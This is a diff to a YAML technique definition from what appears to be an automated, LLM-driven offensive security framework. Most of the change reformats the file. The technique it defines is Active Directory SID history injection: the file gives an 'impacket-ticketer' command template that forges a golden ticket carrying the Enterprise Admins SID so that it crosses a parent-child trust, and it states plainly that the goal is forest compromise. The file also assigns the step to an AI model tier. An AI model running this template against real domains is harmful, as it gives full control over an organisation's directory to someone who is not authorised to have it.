@@ -2,15 +2,18 @@ name: sid_history
 category: ad
 description: SID history injection across trust
 preconditions:
-  - domain_joined
+- domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}' -extra-sid '{parent_da_sid}' -domain {child_domain} Administrator"
+command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}'
+  -extra-sid '{parent_da_sid}' -domain {child_domain} Administrator
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Add Enterprise Admins SID to golden ticket's SID history. Cross parent-child trust for forest compromise. Requires krbtgt hash of child domain."
+mechanism: Add Enterprise Admins SID to golden ticket's SID history. Cross parent-child
+  trust for forest compromise. Requires krbtgt hash of child domain.
+hacktricks_ref: windows-hardening/active-directory-methodology/README.md
